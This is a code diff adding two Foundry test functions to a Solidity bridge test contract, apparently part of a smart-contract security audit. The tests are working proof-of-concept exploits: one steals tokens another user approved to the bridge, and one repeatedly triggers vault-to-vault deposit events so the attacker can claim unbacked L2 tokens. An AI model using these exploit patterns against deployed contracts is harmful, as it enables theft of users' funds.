@@ -264,4 +264,40 @@ contract L1BossBridgeTest is Test {
                 MessageHashUtils.toEthSignedMessageHash(keccak256(message))
             );
     }
+
+    function testCanMoveApproveTokensOfOtherUsers() public {
+        // poor Alice approving
+        vm.prank(user);
+        token.approve(address(tokenBridge), type(uint256).max);
+
+        // Bob
+        uint256 depositAmount = token.balanceOf(user);
+        address attacker = makeAddr("attacker");
+
+        vm.startPrank(attacker);
+        vm.expectEmit(address(tokenBridge));
+        emit Deposit(user, attacker, depositAmount);
+        tokenBridge.depositTokensToL2(user, attacker, depositAmount);
+
+        assertEq(token.balanceOf(user), 0);
+        assertEq(token.balanceOf(address(vault)), depositAmount);
+        vm.stopPrank();
+    }
+
+    function testCanTransferFromVaultToVault() public {
+        address attacker = makeAddr("attacker");
+        uint256 vaultBalance = 500 ether;
+
+        deal(address(token), address(vault), vaultBalance);
+
+        // Can trigger the deposit event, self transfer tokens to the vault
+        vm.expectEmit(address(tokenBridge));
+        emit Deposit(address(vault), attacker, vaultBalance);
+        tokenBridge.depositTokensToL2(address(vault), attacker, vaultBalance);
+
+        // can do this forever
+        vm.expectEmit(address(tokenBridge));
+        emit Deposit(address(vault), attacker, vaultBalance);
+        tokenBridge.depositTokensToL2(address(vault), attacker, vaultBalance);
+    }
 }
